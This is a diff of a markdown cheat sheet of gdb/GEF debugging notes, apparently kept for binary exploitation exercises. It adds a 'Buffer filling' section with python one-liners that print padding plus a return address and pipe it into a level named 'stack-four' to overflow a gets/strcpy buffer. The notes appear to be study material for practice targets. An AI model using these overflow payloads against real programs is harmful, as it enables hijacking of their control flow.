@@ -33,10 +33,23 @@ $7 = 0xb7ffd020
 ```
 (gdb) ptype /o struct locals
 ```
-#### Inputs
+#### Buffer filling
+Useful when trying to overfill a buffer with `gets` / `strcpy` or an `environment variable``
 ```
-// for APIs like gets()
-stack-smash <<< $(python -c 'print "A"*88 + "\x41\x41\x41"')
+// Bash
+$ python -c 'print "A"*(80) + "\x44\x05\x01\x00"' | ./stack-four
+
+// inside gdb
+gef> r <<< AAAA
+
+gef> r <<< $(python -c 'print "A"*80 + "\x44\x05\x01\x00"')
+
+// gdb run and read from bytes from file
+python -c 'print "A"*64' > ~/64_bytes
+gdb myapp
+break *start_level+46
+r < ~/64_bytes
+
 ```
 #### Sections
 ```
@@ -127,13 +140,6 @@ $10 = 84
 
 gef> p/u 0xfffefd74 - 0xfffefd20
 $11 = 84
-```
-#### Buffer filling
-```
-python -c 'print "A"*64' > ~/64_bytes
-gdb myapp
-break *start_level+46
-r < ~/64_bytes
 ```
 #### GEF commands
 ```
